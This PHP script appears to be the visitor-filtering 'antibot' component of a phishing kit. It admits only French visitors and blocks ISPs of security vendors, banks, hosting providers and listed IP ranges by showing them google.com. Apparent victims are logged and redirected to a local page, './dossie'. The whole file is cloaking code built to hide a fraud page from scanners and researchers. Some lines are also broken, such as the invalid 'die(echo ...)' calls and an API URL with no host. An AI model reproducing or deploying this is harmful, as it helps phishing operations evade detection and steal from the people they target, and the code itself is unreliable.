<?php

function getuserip() {
    return $_SERVER['REMOTE_ADDR'];
}

function getlocation($ip) {
    $url = "https://geo.ipify.org/api/v1?apiKey=at_NslOlY6RJx71Iyc1ShAjy5YbcmEBT&ipAddress={$ip}";
    return json_decode(file_get_contents($url), true);
}

function tulis_file($path, $content) {
    $file = fopen($path,"a");
    fwrite($file,$content);
    fclose($file);
}

/** START */

$blocked_words = array();
$black_list = array("Kinet", "a.s.", "s.r.o.", "DetronicsRoute", "Salamon", "Obecne", "O2 Business Services", "DSI DATA", "OVH",  "CompleTel", "SWAN", "VNET", "COLT", "Ozone", "Herault", "Supernet", "Interveille", "hosting", "VIALIS", "LINKSIP", "SAEM", "GTT", "TELOISE", "Nexeon", "Commerciale",  "CRIHAN", "ICAUNAISE", "COOPERATIVE", "NORDNET-EXT", "INFOMIL-CLTPARIS" , "NORDNET", "Technologies" , "cloud", "Knet", "Systeme", "Telia", "EI-TELECOM", "Interministerielle", "Security", "Metropole", "GALIANA", "CNAMTS", "Alcatraz", "Adista", "KEYYO", "Teranet", "OpenIP-Network", "CEGETEL", "DISIC-RIE", "M247", "ALTSYSNET-OCCITANET5G", "Google", "UNIMEDIA-SERVICES", "Cogent", "Netprotect", "velia.net", "NATIXIS", "Electricite", "Labs", "Lyre", "Serveurcom", "Rezopole", "Appliwave", "Epargne", "Anexia", "Caisse", "Sewan" , "Reunicable" , "Axione", "Scalair", "Colt", "epargne", "caisse", "Poste",  "Nerim", "Choopa", "SPIE", "Paritel", "Microsoft", "DATACENTER", "Layer", "ZSCALER", "Coaxis", "Firewall",  "Microsoft" , "RENATER" , "Online" , "Traitement" , "Dedicated" , "Owentis" , "Coriolis" , "Zscaler", "OZN", "CNCA", "Jaguar", "Vultr", "Holdings", "LLC", "NSC-SOLUTIONS", "Backbone", "DSL",  "VadeSecure", "Datacamp", "Momax", "Mutuel" , "FIMATEX" , "NEO", "Credit", "Agricole",  "PSINet", "Skylogic",  "Herault-networks" , "Alliance", "Connectic", "MYSTREAM", "Amazon", "GROUPAMA", "IRIS64", "Francaise", "Opentransit", "Radiotelephone", "BPCE", "Rezocean", "K-net", "SCALEWAY", "Brutele");
$block_list = array("193.56.2", "92.147.12.196", "90.187.228.189", "194.78", "194.78.", "37.201.192.242", "79.166.147.44", "85.73.24.124", "5.203.224.203", "176.167.97.91", "176.176.30", "194.206", "185.", "176.149.93", "82.120.84", "94.143.176", "185.228.2", "176.148.157", "193.57", "89.210.43.74", "62.74.15.205" , "2.10.4", "92.184", "109.221", "77.8.175.91", "31.17.250.35", "86.62.213.130", "78.101.170.24", "31.11.51.55");
$ina_blad_bghiti = "FR";
$real = './dossie';
$bot = 'https://google.com';

$ip = getuserip();
$hostname = gethostbyaddr($ip);

date_default_timezone_set('Europe/Paris');

/** CHECK LOCATION */
$query = getlocation($ip);
$isp = $query['isp'];
$country = $query['location']['country'];

if($country != ($ina_blad_bghiti)){
    $result = '<table > 
            <tr>
                <td style="color:red;">'.$ip.'</td>
                <td style="color:red;">'.$country.'</td>
                <td style="color:red;">'.$isp.'</td>
                <td style="color:red;">Bot</td>
                <td style="color:red;">'.date('Y-m-d h:i:sa').'</td>
            </tr>
        </table>';
    tulis_file("./bad.htm", $result);
    die(echo file_get_contents($bot)); 
}

foreach($black_list as $black) {
    if( stripos($isp, $black) !== false){
        $result ='<table > 
            <tr>
                <td style="color:red;">'.$ip.'</td>
                <td style="color:red;">'.$country.'</td>
                <td style="color:red;">'.$isp.'</td>
                <td style="color:red;">Bot</td>
                <td style="color:red;">'.date('Y-m-d h:i:sa').'</td>
            </tr>
        </table>';
    tulis_file("./bad.htm", $result);
    die(echo file_get_contents($bot)); 
    }
}

/** CHECK HOSTNAME */
foreach($blocked_words as $word) {
    if(substr_count($hostname, $word) > 0) {
        tulis_file("block_bot.txt", "BLOCKED HOSTNAME || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ".$ip." || ".gmdate("Y-n-d")." ----> ".gmdate("H:i:s")."\n\n");
        tulis_file("result/total_bot.txt", "<tr><td><p>$ip|Hostname</p></td></tr>");
        // header('HTTP/1.0 403 Forbidden');
        // die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body>');
        die(echo file_get_contents($bot)); 
    }
}


/** CHECK IP */
foreach($block_list as $block) {
    if(strpos($ip, $block) === 0){
        $result ='<table > 
            <tr>
                <td style="color:red;">'.$ip.'</td>
                <td style="color:red;">'.$country.'</td>
                <td style="color:red;">'.$isp.'</td>
                <td style="color:red;">Bot</td>
                <td style="color:red;">'.date('Y-m-d h:i:sa').'</td>
            </tr>
        </table>';
        tulis_file("./bad.htm", $result);
        die(echo file_get_contents($bot)); 
    }
}

/** LOG IP */
tulis_file("allow.txt", $ip.PHP_EOL);
sleep(0.3);

/** CHECK BOT */
$ua = urlencode($_SERVER['HTTP_USER_AGENT']);
$check = json_decode(file_get_contents('ip='.$ip.'&apikey=e7032b2522dfd49f07ba78770ba4dddd&ua='.$ua), true);
$is_bot = $check['is_bot'];
if($is_bot != 1) {
    $result = '<table > 
                    <tr>
                        <td style="color:green;">'.$ip.'</td>
                        <td style="color:green;">'.$country.'</td>
                        <td style="color:green;">'.$isp.'</td>
                        <td style="color:green;">User</td>
                        <td style="color:green;">'.date('Y-m-d h:i:sa').'</td>
                    </tr>
                </table>';
    tulis_file("./allow_success.txt", $ip.PHP_EOL);
    tulis_file("./drag.htm", $result);
    die(header('location: '.$real));
}

die(echo file_get_contents($bot)); 